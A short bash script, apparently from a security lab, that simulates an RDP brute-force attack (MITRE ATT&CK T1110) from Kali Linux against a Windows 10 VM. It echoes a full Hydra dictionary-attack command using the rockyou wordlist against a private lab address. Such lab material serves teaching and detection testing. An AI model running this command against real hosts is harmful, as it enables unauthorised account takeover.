#!/bin/bash
# MITRE ATT&CK T1110 - RDP Brute Force Simulation
# Target: Windows 10 VM (Victim)
# Attacker Machine: Kali Linux

# Syntax used to execute the dictionary attack:
# hydra -l [TARGET_USER] -P [PASSWORD_LIST] rdp://[VICTIM_IP] -V

echo "[*] Simulating RDP Brute Force attack..."
echo "Command executed: hydra -l testing -P /usr/share/wordlists/rockyou.txt rdp://10.0.2.15 -V"
